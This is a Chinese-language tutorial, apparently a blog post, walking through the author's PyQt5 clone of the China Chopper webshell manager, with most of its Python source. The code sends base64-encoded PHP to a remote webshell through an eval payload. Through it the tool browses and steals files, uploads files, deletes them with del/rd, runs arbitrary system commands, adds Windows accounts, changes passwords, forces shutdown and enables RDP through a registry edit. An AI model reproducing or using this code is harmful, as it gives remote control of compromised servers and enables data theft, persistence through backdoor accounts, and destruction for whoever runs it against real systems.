## 		Python knife

​    一款伪菜刀。

​    设计之初，本想只写个命令行的就可以了，但又想与众不同，想用python写代码，又不想用c#写前端（c#太卡了），万分无奈之下，找到一个替代品，Pyqt，所以我这个简易的菜刀就由此开始了。本程序实在python3下开发的。GUI界面用的Pyqt模块
既然想用pyqt做界面，第一步就是先装好pyqt，

#### Python knife介绍视频

<https://pan.baidu.com/s/1skQdp5fIIS4BlqrWp2CbFw>

## 0x01 PYQT的安装

#### 1.安装好Python3的环境

 添加环境变量，保证安装正确，

#### 2.安装PyQt5

采用命令安装，Win+R，输入CMD，打开命令框，输入以下命令。后面是豆瓣的镜像地址，是为了加快下载速度。

```python
pip install PyQt5 -i https://pypi.douban.com/simple
```

#### 3.安装Qt的工具包

```python
pip install PyQt5-tools -i https://pypi.douban.com/simple
```

#### 4.测试PyQt5环境是否安装成功

复制以下代码到后缀为.py的文件中

```python
import sys
from PyQt5 import QtWidgets,QtCore
app = QtWidgets.QApplication(sys.argv)
widget = QtWidgets.QWidget()
widget.resize(360,360)
widget.setWindowTitle("hello,pyqt5")
widget.show()
sys.exit(app.exec_())
```

能够运行即安装成功



## 0x02 GUI界面设计

下面是最初的设计功能：

#### Shell管理

```
连接shell

添加shell

编辑shell

删除shell

清空shell
```

#### 文件管理

```
更新

上传

下载

重命名

删除文件
```

#### 虚拟终端

```
基本未写，就写了一个命令执行
```

#### 自写脚本

```
目前是一个最简单的文本编辑器
```

#### 数据库管理

```
待写
```

#### 快捷功能

```
查询用户

添加用户

修改密码

强制关机

格式化C盘

开启3389

中文检测

联系作者

退出程序

待添加
```



## 0x03 后端代码介绍

下面是我用到的一些PYQT的控件

```
Label标签控件
Pushbutton按钮控件
textEdit文本框控件
Listweight列表控件
treeWidget树形控件
tabWidget 控件
```

### 一．Shell管理

这里呢，我采用了GUI和代码分离的形式写的，pyqt生成的代码各自在自己的文件里，而我自己写的程序代码在一个类中。

#### 1.创建右键菜单

初学QT，什么都不会，这个也是靠看一些博客才写出来的

```python
def createContextMenu(self):
    # 创建右键菜单
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested信号 		
    self.Ui.listWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
  	self.Ui.listWidget.customContextMenuRequested.connect(self.showContextMenu)
    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.connect_shell_button = self.contextMenu.addAction(u'连接')
    self.add_shell_button = self.contextMenu.addAction(u'添加')
    self.modify_shell_button = self.contextMenu.addAction(u'编辑')
    self.delete_shell_button = self.contextMenu.addAction(u'删除')
    self.delete_all_shell_button = self.contextMenu.addAction(u'清空')

    # 将动作与处理函数相关联，
    # 将他们分别与不同函数关联，实现不同的功能
    self.connect_shell_button.triggered.connect(self.Connect_shell)
    self.add_shell_button.triggered.connect(self.Add_shell_show)
    self.modify_shell_button.triggered.connect(self.Modify_shell)
    self.delete_shell_button.triggered.connect(self.Delete_shell)
    self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
```

将右键菜单移动到鼠标的位置

```python
def showContextMenu(self, pos):  #右键点击时调用的函数
    # 菜单显示前，将它移动到鼠标点击的位置
    self.contextMenu.move(QtGui.QCursor.pos())
    self.contextMenu.show()
```


这便是右键菜单的函数，然后在初始化函数中点用这个函数就OK了

#### 2.添加shell

添加shell这里要调用添加shell这个窗口，当我点击右键的添加时，打开添加shell窗口，当点击子窗口的确定时，将子窗口两个输入框中的内容组合起来添加到主窗口的shell管理列表中

涉及到两个窗口之间的窗体问题，这就让我非常懵逼了。。
还有listweight的添加等操作

点击添加显示添加shell窗口

```python
def Add_shell_show(self):
	self.WChild = Ui_Form()
	self.dialog = QtWidgets.QDialog(self)
	self.WChild.setupUi(self.dialog)
	self.dialog.show()
	self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
```

获取内容返回给主窗口

```python
def GetLine(self):  # 添加shell给listweiget传值
	url = self.WChild.lineEdit.text()
	passwd = self.WChild.lineEdit_2.text()
	if(url == "" or passwd ==""):   #判断地址或者密码是不是空
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "地址或密码不能为空！")
    else:
        data =url+"          "+passwd  #得到添加shell的内容并组合
        self.Ui.listWidget.addItem(data)   #添加内容
        self.dialog.close()
```

#### 3.编辑shell

这个功能就是点击编辑shell调用添加shell窗口，同样的把列表中选中的值赋值给子窗口的输入框，然后用户修改，再把值赋值给主窗口原来的位置

点击编辑时

```python
shell = self.Ui.listWidget.currentItem().text()  #获取选中行的文本
    self.Add_shell_show()    #显示子窗口
    shell = shell.split("          ")   #分割数据
    self.WChild.lineEdit.setText(shell[0])   #给子窗口赋值
    self.WChild.lineEdit_2.setText(shell[1])
    self.WChild.pushButton.setText("编辑")
    #删除选中的行
except:
    box = QtWidgets.QMessageBox()
    box.warning(self, "提示", "请选择一项！")
```

这里因为时两个按钮调用同一个子窗口，所以我在窗口实现实时用了sender来判断是谁发出的信号
窗口显示函数如下

```python
def Add_shell_show(self):
	self.WChild = Ui_Form()
	self.dialog = QtWidgets.QDialog(self)
	self.WChild.setupUi(self.dialog)
	self.dialog.show()
	sender = self.sender()
	if sender.text() == "添加":
        self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
    elif sender.text() == "编辑":
        self.WChild.pushButton.clicked.connect(self.editLine)  # 子窗体确定编辑shell
```

当子窗口点击确定后调用editline函数修改原来的项

```python
def editLine(self):
    url = self.WChild.lineEdit.text()  #获取子窗口的值
    passwd = self.WChild.lineEdit_2.text()
    data = url + "          " + passwd
    shell = self.Ui.listWidget.currentRow() #获取选择项的行号
    self.Ui.listWidget.item(shell).setText(data)   #给listwidget赋值
    self.dialog.close()   #关闭子窗口
```

#### 4.删除shell

这个就比较简单了，直接删除listweight中的数据就可以了。当点击删除时，调用下面的函数删除

```python
def Delete_shell(self):
    button = QMessageBox.question(self, "警告！",
                                  self.tr("你确定要删除选中的项吗？"),
                                  QMessageBox.Ok | QMessageBox.Cancel,
                                  QMessageBox.Ok)
    if button == QMessageBox.Ok:
        shell = self.Ui.listWidget.currentRow()  # 获取选择项的行号
        # shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
        shell2 = self.Ui.listWidget.currentItem().text()
        self.Ui.listWidget.takeItem(shell)  # 删除listwidget中的数据
    else:
        return
```

这里有个警告框，以免用户误操作

#### 5.清空shell

上面的删除只是删除一条数据，而清空则时删除所有内容。
点击清空调用的函数

```python
def Delete_all_shell(self):
    button = QMessageBox.question(self, "警告！",
                                  self.tr("你确定要清空所有内容吗？"),
                                  QMessageBox.Ok | QMessageBox.Cancel,
                                  QMessageBox.Ok)
    if button == QMessageBox.Ok:
        self.Ui.listWidget.clear()
        os.remove("shell.txt")  #删除shell.txt文件
    else:
        return
```


这里判断了给用户了一个提示框是否是清空所有内容，以防用户误删除。

同样也有提示框

#### 6.最后呢。当然是讲一下最重要的连接了

当前用户点击连接时，会自动调用一个函数发送POST请求，测试shell是否可用。

```python
def Connect_shell(self):
    #shell = self.Ui.listWidget.currentRow() #获取选择项的行号
    try:
        shell = self.Ui.listWidget.currentItem().text()  
        # 返回选择行的数据
        #shell2 = self.Ui.shelllabel.text()  # 获取shell
        #print(shell)
        shell2 = shell.split("          ")  #
        #print(shell)
        #print(shell2[1])
        phpcode = "echo(hello);"
        phpcode=base64.b64encode(phpcode.encode('GB2312'))
        #print(phpcode)
        data = { shell2[1] : '@eval(base64_decode($_POST[z0]));' ,
                'z0':  phpcode}
        #print(data)
        returndata =self.filedir(shell2,data)
        #print(returndata)
        if returndata != "":
            #print(returndata)
            box = QtWidgets.QMessageBox()
            #self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "连接成功！")
            self.Ui.shelllabel.setText(shell)
            self.File_update()  #显示目录
            self.Virtualshell()

            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")
                except:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "连接失败！")
```
POST请求函数

```python
def filedir(self,shell,phpcode): #发送php请求
    #请求头
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded" 
        #以表单的形式请求
    }
    #print(phpcode)
    #print(shell[0])
    #print(phpcode)

    postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")
    req = urllib.request.Request(shell[0], postData, headers)
    # 发起请求
    response = urllib.request.urlopen(req)
    #data = (response.read()).decode('utf-8')
    return (response.read())
```

#### 7.保存shell

至此呢，shell管理大致完成了，当然，还有最重要的一点，当用户退出软件再次打开软件时，怎么才能保持shell还在呢。这里呢，我就保存到一个txt文件中了，刚开始的时候我是每次添加，编辑，删除，都会重新写入文件。后来我又找到一种简单的方法，那就是重载关闭事件。在软件关闭时，将listweight中的数据保存到txt文件中
代码如下

```python
def closeEvent(self, event):
    num = self.Ui.listWidget.count()  #获取listweight行数
    #print(num)
    f=open("shell.txt", "w",encoding='utf-8')   # 打开文件
    for i in  range(0,num):
        data=self.Ui.listWidget.item(i).text()  #获取i行的数据
        #print(data)
        f.write(data + "\n")  # 写入文件
    f.close()  #关闭文件
```

当每次打开文件时，加载txt文件，代码如下

```python
def readshellfile(self):  #读取shell文件
        try:
            with open("shell.txt", 'r',encoding='utf-8') as f:  
            # 打开文件
                for each in f:  # 遍历文件
                    each = each.replace('\n', '')  
                    # 替换换行符为空格
                    if each !="                                  shell 地 址                                      密码":
                        self.Ui.listWidget.addItem(each)  
                        # 添加到列表
                f.close()  # 关闭文件
        except:
            pass
```

这里呢。我加了个try防止出错误，因为如果文件不存在，就会报错，加上了try就不会了哈哈

### 二、文件管理

#### 1.创建右键菜单

这里呢创建右键菜单

```python
def fileContextMenu(self):
    '''''
    创建右键菜单
    '''
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested信号
  	self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
    self.Ui.treeWidget_2.customContextMenuRequested.connect(self.showContextMenu)

    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.file_update = self.contextMenu.addAction(u'更新')
    self.file_upload = self.contextMenu.addAction(u'上传')
    self.file_download = self.contextMenu.addAction(u'下载')
    self.file_delete = self.contextMenu.addAction(u'删除')
    self.file_rename =self.contextMenu.addAction(u'重命名')

    #将动作与处理函数相关联
    #这里为了简单，将所有action与同一个处理函数相关联，
    #当然也可以将他们分别与不同函数关联，实现不同的功能
    self.file_update.triggered.connect(self.File_update)
    self.file_upload.triggered.connect(self.File_upload)
    self.file_download.triggered.connect(self.File_download)
    self.file_delete.triggered.connect(self.File_delete)
    self.file_rename.triggered.connect(self.renameshow)
```

下面这个函数是吧右键菜单移动到鼠标的位置

```python
def showContextMenu(self, pos):  #右键点击时调用的函数
    # 菜单显示前，将它移动到鼠标点击的位置
    self.contextMenu.move(QtGui.QCursor.pos())
    self.contextMenu.show()
```

这里遇到一个特别大的问题，两个右键菜单同时调用，两边会显示一模一样的菜单。
在这个位置，我耽误了好久
最后用的重写焦点响应事件来创建不同的右键菜单
函数如下

```python
def eventFilter(self, widget, event):  #重写焦点响应事件
    if (widget != None):
        #print(currentitem)
        if (widget.inherits("QListWidget")):  #创建添加shell菜单
            self.createContextMenu()

        elif (widget.inherits("QTreeWidget")):#创建文件菜单
            self.fileContextMenu()
        else:
            pass
		return False
```

功夫不负有心人，不同的右键菜单横空出世！

虽然，我这个方法有点笨，但是初学PYQT，实在不会其他的方法了，大神见谅。
然后在这里还有一问题没解决，就是右键菜单点一下不会消失，还得点一下才行。

#### 2.更新

更新便是发送一个POST请求，列出目录到treeweight上，代码如下

```python
def File_update(self):
    shell = self.Ui.shelllabel.text()
    if shell!="":
    #列出目录
    	self.Ui.treeWidget.clear() #清空treeweight的所有内容
    	self.Ui.treeWidget_2.clear() #清空treeweight_2的所有内容    
    	path=["C:","D:","E:"]   #列出3个盘
    	#print(path)
        for i in path:  #循环列出c盘  D盘
            data=self.listfile(i)   #调用列出目录
            data = data.decode('utf-8',"ignore")
            #print(data)
            if data =='ERROR:// Path Not Found Or No Permission!':  
                #判断3个盘是不是存在
            	pass
            else:  #若存在 列出目录
                listdata = data.split('  ')   # 分割data
                root = QTreeWidgetItem(self.Ui.treeWidget)  #创建对象
                #self.tree = QTreeWidget()
                root.setText(0,i)  #创建主节点
    			listdata=listdata[:-1]   #去掉空格
                for i in listdata:  #循环每一个元素

                	singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割

                    if singerdata[0][-1] == "/": #判断是不是有下级目录
                        singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点
                        child1 = QTreeWidgetItem(root)   #子节点位置
                        child1.setText(0, singerdata[0])   #子节点赋值
                    # else:
                    #     child2 = QTreeWidgetItem(child1)  # 创建子子节点
                    #     child2.setText(0, singerdata[0])  # 赋值

                    #phpcode = "system('" + "dir" + "');"
    else:
		box = QtWidgets.QMessageBox()
		box.information(self, "提示", "请先连接shell！")
```

这里涉及到几个盘的问题，我是把他存到一个列表里，然后依次循环每一个盘来列出目录
函数如下

```python
def listfile(self,path):  #列出目录
    shell = self.Ui.shelllabel.text()  #获取shell
    #print(shell)
    shell = shell.split("          ")
    phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
    #print(phpcode)
    data = {shell[1]:  phpcode}
    #print(data)
    return self.filedir(shell,data)  #返回数据
```

#### 3.双击右侧treeweight显示详细信息

这里就是利用双击获取选中的文件名，然后获取父节点的名组合成路径，发送一个请求。将返回的数据分隔开写入到treeweight_2中

```python
def displayfile(self):
    try:
        index = self.Ui.treeWidget.currentItem()   #当前的Item对象
        #print(filepath)  #输出当前项的绝对目录
        data=self.listfile(self.showfilepath())   #调用函数显示数据
        #print(data)
        listdata = data.split('  ')   #将文件分开
        #print(listdata)
        listdata = listdata[:-1]  #去掉最后的空
        #print(listdata)
        self.Ui.treeWidget_2.clear()  #清空treeweight_2中的所有数据
        for i in listdata:  # 循环每一个元素
            singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
            #print(singerdata[0])
            if singerdata[0] !="./" and singerdata[0] != "../" and singerdata[0][-1]=="/" :
                child2 = QTreeWidgetItem(index)  # 创建子子节点
                child2.setText(0, singerdata[0][:-1])
                #将文件详细信息写入到listweight_2
            if singerdata[0] != "./" and singerdata[0] != "../" and singerdata[0][-1]!="/":  #文件显示出来,不显示文件夹！！！
                if singerdata[0][-1]=="/":  #去掉文件夹后面的斜杠
                    singerdata[0]=singerdata[0][:-1]
                try:
                    singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                except:
                    pass
                # print(singerdata)
                root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                #显示数据
                root.setText(0, singerdata[0])
                root.setText(1, singerdata[1])
                root.setText(2, singerdata[3])
                root.setText(3, singerdata[2])
    except:
    	pass
```

在显示文件大小的时候有一个换算函数，将字节换算成KB、M或者、G

换算文件大小

```python
def Transformation(self,size):
    if (size < 1024):
        return str(size) + " B"
    elif 1024 < size < 1048576:
        size = round(size / 1024, 2)
        return str(size) + " KB"
    elif 1048576 < size < 1073741824:
        size = round(size / 1048576, 2)
        return str(size) + " MB"
    elif size > 107374824:
        size = round(size / 1073741824, 2)
        return str(size) + " GB"
    else:
        pas
```

#### 4.上传文件

上传文件，我是创建了一个文件打开对话框用来读取文件名，
文件打开对话框函数如下

```python
def fileopen(self):
    fileName, selectedFilter = QFileDialog.getOpenFileName(self,(r"上传文件"),(r"C:\windows"),r"All files(*.*);;Text Files (*.txt);;PHP Files (*.php);;ASP Files (*.asp);;JSP Files (*.jsp);;ASPX Files (*.aspx)")
	return (fileName)  #返回文件路径
```

文件上传主函数

```python
def File_upload(self):
    # 尝试获取文件路径
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        try:
            fileName =  self.fileopen()   #调用文件打开对话框
        	#print(type(fileName))
            #print(fileName)
            try:
                # 尝试打开文件读取数据
                f = open(fileName,"rb")
                fsize = os.path.getsize(fileName) #获取文件大小
                filedata = f.read()
                shell = shell.split("          ")
                f.close()
                #print(fsize)
                #print(filedata)
                #z2 = base64.b64encode(filedata)
                newfileName=fileName.split("/")
                #print(newfileName[-1])
                path=self.showfilepath()+"\\\\"+newfileName[-1]
                #print(path)
                #shell = self.Ui.shelllabel.text()  # 获取shell
                z = r"@eval(base64_decode($_POST[z0]));"  # 文件执行代码
                z0 = base64.b64encode((str('$c=base64_decode($_POST["z2"]); echo(@fwrite(fopen("'+path+'","w"),$c));die();')).encode('utf-8'))
                #z1 = base64.b64encode((str(path)).encode('utf-8')) # 文件路径加密
                #print(filedata)
                z2 = base64.b64encode(filedata)  # 文件数据加密
                #print(z0)
                #print(z1)
                #print(z2)
                data = {shell[1]:z,"z0":z0,"z2":z2}
                #print(data)
                result =self.filedir(shell,data)
                result = result.decode('utf-8',"ignore")
                #print(type(result))
                #print(result)#
                if int(result)==fsize:
                    self.displayfile()  #刷新显示
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "上传成功!\n上传路径: "+path)
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "上传失败!")
            except:
                f.close()
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "文件太大。上传失败！")
        #文件路径获取失败
        except:
            pass
    else:
        box = QtWidgets.QMessageBox()
        # self.statusBar().showMessage(shell )  # 状态栏显示信息
        box.information(self, "提示", "请先连接shell！")
```

然后呢，这里上传文件涉及到获取listweight的位置问题，所以了下面就是获取listweight上传位置的函数
#显示当前对象的路径

```python
def showfilepath(self):
      #filename = self.Ui.treeWidget.currentItem().text(0)  #当前目录或文件名
      index = self.Ui.treeWidget.currentItem()   #当前的Item对象
      try:
          filepath = index.text(0)
          index2=index.parent().text(0)   #父节点
          filepath = index2+'\\\\'+index.text(0)  #组合
          index3=index.parent().parent().text(0)   #父父节点
          filepath = index3 + '\\\\' + filepath  #组合目录
          index4=index.parent().parent().parent().text(0)   #父父父节点
          filepath = index4 +'\\\\' + filepath  #组合目录
          index5=index.parent().parent().parent().parent().text(0)   #父父父父节点
          filepath = index5 +'\\\\' + filepath  #组合目录
          index6 = index.parent().parent().parent().parent().parent().text(0)  # 父父父父节点
          filepath = index6 + '\\\\' + filepath  # 组合目录
      except:
          pass
      #print(filepath)
      return filepath
```

这里调用的sendcode函数是用来给发送的数据base64加密的函数

```python
def sendcode(self,phpcode):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        shell = shell.split("          ")
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                'z0': phpcode}
        return self.filedir(shell, data)
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

#### 5.下载文件

下载文件亦是如此，需要获取当前的本地路径然后用php代码打开靶机的文件发送过来，然后打开保存文件对话框，写入文件。

主函数

```python
def File_download(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":  #判断是否连接shell
        try:
            path =self.showfilepath()  #获取文件的路径
            filepath = self.Ui.treeWidget_2.currentItem().text(0)  #获取文件名
            compath = path+"\\\\"+filepath  #组合路径
            phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
            #print(filepath)
            #print(compath)
            #print(phpcode)
            returndata = self.sendcode(phpcode)  #尝试下载文件
            #print(returndata)
            #写入文件
            #print(returndata)
			if returndata != "" and returndata != "Unable to open file!":
                savefilepath = self.filesave(filepath)
                #print(filepath)
                #print(savefilepath)
                f = open(savefilepath, "wb")  # 打开文件
                f.write(returndata)  # 写入文件
                f.close()  # 关闭文件
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "下载成功！")
            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "下载失败！")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "下载失败！")
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

文件保存对话框

```python
def filesave(self,filename):
    fileName, filetype= QFileDialog.getSaveFileName(self, (r"保存文件"), (r'C:\Users\Administrator\\'+ filename), r"All files(*.*)")
    #print(fileName)
    return fileName
```

#### 6.删除文件

文件删除就比较简单了，直接获取文件路径，发送一个cmd命令，同时删除掉treeweight中的节点就ok了

```python
def File_delete(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell !="":
        try:
            path = self.showfilepath()  # 获取文件的路径
            filepath = self.Ui.treeWidget_2.currentItem().text(0)  # 获取文件名
            compath = path + "\\\\" + filepath  # 组合路径
            #print(compath)
            hitgroup= self.Ui.treeWidget_2.currentIndex().row()
            #删除文件
            shell = shell.split("          ")
            phpcode1 = "system('" + "del /S /Q "+compath + "');"
            self.sendcode(phpcode1)
            #删除目录
            phpcode2 = "system('" + "rd /S /Q " + compath + "');"
            self.sendcode(phpcode2)
            self.Ui.treeWidget_2.takeTopLevelItem(hitgroup)  #删除节点
           box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "删除成功！")
        except:
            pass
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

#### 7.重命名

由于网络上关于pyqt的资料太少，能力有限，不会将选中的文件名变为可编辑模式，所以编写了一个窗口，让用户来重新输入用户名。

重命名对话框

```python
def renameshow(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        self.rename = Ui_renameForm()
        self.dialog = QtWidgets.QDialog(self)
        self.rename.setupUi(self.dialog)
        self.dialog.show()
        self.rename.renameButton.clicked.connect(self.File_rename)
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

对话框确定按钮

```python
def File_rename(self):
    #hitgroup = self.Ui.treeWidget_2.currentIndex().row()#获取要修改的行号
    renamefile = self.rename.renameedit.text() #获取要修改的文件名
    #print(renamefile)
    parentpath= self.showfilepath()  #获取路径
    #print(parentpath)
    index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
    filename = index.text(0)  # 获取文件名
    path = parentpath+"\\\\"+filename  #组合路径
    #print(path)
    phpcode = 'system("rename '+path+' '+renamefile+'");echo(ok);'  #重命名
    returndata=  self.sendcode(phpcode)  #发送数据
	if returndata == "ok":
        self.dialog.close()  # 关闭子窗口
        self.displayfile()    #刷新显示
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "重命名", "重命名失败！")
```

### 三．虚拟终端

这里的虚拟终端我写的比较简单，其实叫命令执行更合适。
#虚拟终端

```python
def Virtualshell(self):
    self.Ui.textEdit.setReadOnly(True)  #设置textRdit不可编辑
    self.Ui.textEdit.setText(r"C:\Users\admin> ")
```

虚拟终端执行按钮

```python
def shellcommand(self):
    self.Ui.textEdit.clear()
    shellcommand = self.Ui.lineEdit.text()
    #print(shellcommand)
    #print(shell)
    phpcode = "system('" + shellcommand + "');"
    #print(phpcode)
    returncommand = self.sendcode(phpcode)
    #print(type(returncommand))
    #print(returncommand)
    self.Ui.textEdit.setText(returncommand)
```

虚拟终端清空按钮

```python
def clearVirtual(self):
    self.Ui.lineEdit.clear()
    self.Ui.textEdit.clear()
```

### 四．自写脚本

自写脚本就是一个就简单的文件编辑器。可以用来保存和清空 
保存脚本代码

```python
def SaveJiaoben(self):
    data  = self.Ui.textEdit_3.toPlainText()  #获取textEdit_3的内容
    if data != "":
        try:
            path = self.filesave("jiaoben.txt")
            f= open(path,"w",encoding='utf-8')
            f.write(data)
            f.close()
        except:
            pass
    else:
        box = QtWidgets.QMessageBox()
        box.warning (self, "警告", "您未输入任何字符！")
```

脚本清空按钮

```python
def ClearJiaoben(self):
    self.Ui.textEdit_3.clear()
```

### 五．数据库管理

暂无，以后添加

### 六．快捷功能、

#### 1.查询用户

```python
def User(self):
    user = ""
    phpcode = 'system("net user");'
    #print(phpcode)
    data = self.sendcode(phpcode)
    #print(data)
    #print(data[113:-20])
    if data !=None:
        data=data[113:-20].replace('\r\n', '').split(" ")
        #print(data)
        for i in data:
            if i !="":
                user += "用户："+i+"\n"
        #print(user)
        box = QtWidgets.QMessageBox()
        box.about (self, "查询用户", user[:-1])
    else:
        pass
```

这里的代码都比较简单，就是执行一条命令获取所有用户，然后提取出想要的内容弹出窗口展示给用户

#### 2.添加用户

```python
def Adduser(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    username = self.adduser.userEdit.text()  #获取添加用户对话框用户名
    #print(username)
    password = self.adduser.passwordEdit.text() #获取添加用户对话框密码
    phpcode = 'system("net user '+username+" "+password+" "+'/add");' #组合命令
    #print(phpcode)
    returndata  = self.sendcode(phpcode)    #发送命令
    if returndata !="":
        self.dialog.close()
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "添加成功！")
    else:
        self.dialog.close()
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "添加失败！")
    #print(username)
    #print(password)
	#print(returndata)
    #print(data)
```

添加用户，同样是调用了一个子窗口，提示用户输入要添加的用户名和密码，再把用户名和密码和cmd命令组合起来发送给靶机执行

#### 3.修改密码

```python
#修改密码按钮调用的函数
def Changepasswd(self):
    username = self.changepasswd.changeuserEdit.text()  #获取修改密码窗口的用户名
    passwd = self.changepasswd.changepasswordEdit.text() #获取修改密码窗口的密码
    #print(username)
    #print(passwd)
    phpcode = 'system("net user ' + username + " " + passwd +'" );'  # 组合命令
    #print(phpcode)
    returndata = self.sendcode(phpcode)  # 发送命令
    #print(returndata)
    if returndata !="":
        self.dialog.close()
        box = QtWidgets.QMessageBox()
       box.information(self, "提示", "修改成功！")
    else:
        self.dialog.close()
       box = QtWidgets.QMessageBox()
        box.information(self, "提示", "没有此用户或没有权限，修改失败！")
```

同样是调用了一个子窗口，提示用户输入要修改的用户名和密码，再把用户名和密码和cmd命令组合起来发送给靶机进行修改密码

#### 4.强制关机

```python
def Shutdown(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要强制关机吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
    		shell = self.Ui.shelllabel.text()  # 获取shell
            phpcode = 'system("shutdown -p");echo(ok);'
            data = self.sendcode(phpcode)
            if data!=None:
                if data == "ok":
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "强制关机成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "强制关机失败！")
            else:
                pass
            #print(data)
        else:
            return
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")      
```

这里呢。调用了一个询问框，以免用户误操作

#### 5.开启3389

```python
#开启3389按钮
def Open3389(self):
    phpcode ='system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");'
    result = self.sendcode(phpcode)
    if result !=None:
        data = self.sendcode('system("netstat -ano |findstr 0.0.0.0:3389");')
        if data !=None:
            if data!="":
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "开启成功！")
            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "抱歉，您没有权限！")
        else:
            return
    else:
        return
```

同样是cmd命令执行

#### 6.中文检测

这个就比较高大上了，这个是调用的我以前的程序。用tkinter模块写的。这个是我以前写的，随便加进来的

```python
#中文检测
def Chinese(self):
    try:
        os.system("python 中文符号检测工具.py")
    except:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "模块不存在！")
```

#### 7.检查更新

```python
def Update(self):
    box = QtWidgets.QMessageBox()
    box.about (self, "检查更新", "\n当前版本：V 1.0\n最新版本：V 1.0 ")
    #这东西更不更新没有任何意义，hhh
```

#### 8.联系作者

当点击联系作者的时候会自己打开主页的主页哦

```python
#联系作者
def Loveme(self):
    webbrowser.open("https://blog.csdn.net/qq_36374896")
    box = QtWidgets.QMessageBox()
    box.information (self, "联系作者", "作者邮箱：qianxiao996@126.com\n作者主页：https://blog.csdn.net/qq_36374896")
```

这里呢还有个图标问题

一行代码搞定

```python
self.setWindowIcon(QtGui.QIcon('./img/main.png'))
```

## 0x04总结

完整代码在附件。菜刀文件写了800行代码，中文检测50多行代码，再加上各个ui生成的代码大约400多行，总共大约1300行代码吧，历时十几天，中间遇到许多问题，靠自己百度突破，收获很大，很有成就感。学习路还长，加油。
到这里想写的功能都写完了，其他代码在附件中！

## 0x05参考文章

网络上的教程大部分都是c++QT的pyqt的真的少。。。。

Pyqt Python GUI 入门教程
​	https://max.book118.com/html/2018/0805/8004075040001117.shtm
州的先生系列教程
​	https://zmister.com/archives/category/guidevelop/pyqt5_basic
吴秦（Tyler）
​	https://www.cnblogs.com/skynet/p/4229556.html
资料汇总
​	http://www.cnblogs.com/txw1958/archive/2011/12/18/2291928.html

## 0x06附件

初始化函数

```python
self.Ui.listWidget.installEventFilter(self)  #初始化QListView控件焦点事件
self.Ui.treeWidget_2.installEventFilter(self)  #初始化treeWidget_2控件焦点事件
self.readshellfile()  #加载文件到listweight
self.Ui.treeWidget.doubleClicked.connect(self.displayfile) #teeweight双击
